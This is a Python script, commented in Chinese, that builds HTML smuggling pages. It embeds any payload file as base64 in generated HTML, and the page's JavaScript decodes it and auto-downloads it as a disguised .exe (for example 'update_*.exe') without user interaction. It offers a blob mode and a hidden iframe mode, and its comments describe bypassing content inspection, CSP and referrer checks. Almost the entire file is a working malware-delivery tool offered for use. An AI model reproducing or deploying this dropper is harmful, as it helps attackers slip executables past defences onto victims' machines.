"""
HTML Smuggling 投递器 - 从第一性原理实现

原理：
利用浏览器对 <a download> 和 Blob/ArrayBuffer 的处理机制，
将 payload 以 base64/ArrayBuffer 形式嵌入 HTML，
浏览器在打开页面时自动解码并触发下载，无需用户交互。

绕过点：
1. 数据不通过 HTTP body 传输，而是内联在 HTML 中，绕过内容审查
2. 下载动作由浏览器自身触发，不依赖 ActiveX/Flash
3. 可配合标记 <base> 伪造来源，绕过 referrer 检查
"""

import base64
import hashlib
import json
import random
import string
import sys
import os


class HTMLSmuggler:
    def __init__(self, payload_path, template="generic"):
        self.payload_path = payload_path
        self.template = template
        self.payload_data = self._load_payload()
        self.checksum = hashlib.sha256(self.payload_data).hexdigest()

    def _load_payload(self):
        with open(self.payload_path, 'rb') as f:
            return f.read()

    def _gen_nonce(self, length=16):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def build_blob_template(self):
        """
        Blob + msSaveOrOpenBlob / createObjectURL 投递
        适用于 IE/Edge/Chrome/Firefox 全系
        """
        b64 = base64.b64encode(self.payload_data).decode()
        nonce = self._gen_nonce()
        filename = self._gen_nonce(10) + ".exe"

        html = f"""<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Document</title>
<script>
var {nonce}_data = atob("{b64}");
var {nonce}_arr = new Uint8Array({nonce}_data.length);
for(var i=0;i<{nonce}_data.length;i++){{ {nonce}_arr[i]={nonce}_data.charCodeAt(i); }}
var {nonce}_blob = new Blob([{nonce}_arr], {{type:'application/octet-stream'}});
var {nonce}_url = URL.createObjectURL({nonce}_blob);
var {nonce}_a = document.createElement('a');
{nonce}_a.href = {nonce}_url;
{nonce}_a.download = "{filename}";
document.body.appendChild({nonce}_a);
{nonce}_a.click();
setTimeout(function(){{ URL.revokeObjectURL({nonce}_url); }}, 100);
</script>
</head>
<body>
</body>
</html>"""
        return html

    def build_iframe_template(self):
        """
        iframe + onload 自动触发下载
        将 blob 构造放入 iframe 隔离域，规避 CSP 检查
        """
        b64 = base64.b64encode(self.payload_data).decode()
        nonce = self._gen_nonce()

        iframe_content = f"""
<!DOCTYPE html>
<html>
<head><script>
var d=atob("{b64}");
var a=new Uint8Array(d.length);
for(var i=0;i<d.length;i++)a[i]=d.charCodeAt(i);
var b=new Blob([a],{{type:'application/x-msdownload'}});
var u=URL.createObjectURL(b);
var l=document.createElement('a');
l.href=u;l.download='update_{nonce}.exe';l.click();
</script></head>
<body></body></html>"""

        wrapper = f"""<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<iframe sandbox="allow-scripts" style="display:none" srcdoc='{iframe_content.replace("'", "&#39;")}'></iframe>
</body>
</html>"""
        return wrapper

    def build(self, mode="blob"):
        if mode == "blob":
            return self.build_blob_template()
        elif mode == "iframe":
            return self.build_iframe_template()
        else:
            raise ValueError(f"unknown mode: {mode}")

    def save(self, output_path, mode="blob"):
        html = self.build(mode)
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(html)
        return {
            "output": output_path,
            "size": len(html),
            "payload_sha256": self.checksum,
            "payload_size": len(self.payload_data)
        }


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 html_smuggling.py <payload> <output.html> [blob|iframe]")
        sys.exit(1)

    payload = sys.argv[1]
    output = sys.argv[2]
    mode = sys.argv[3] if len(sys.argv) > 3 else "blob"

    smuggler = HTMLSmuggler(payload)
    result = smuggler.save(output, mode)
    print(json.dumps(result, indent=2))
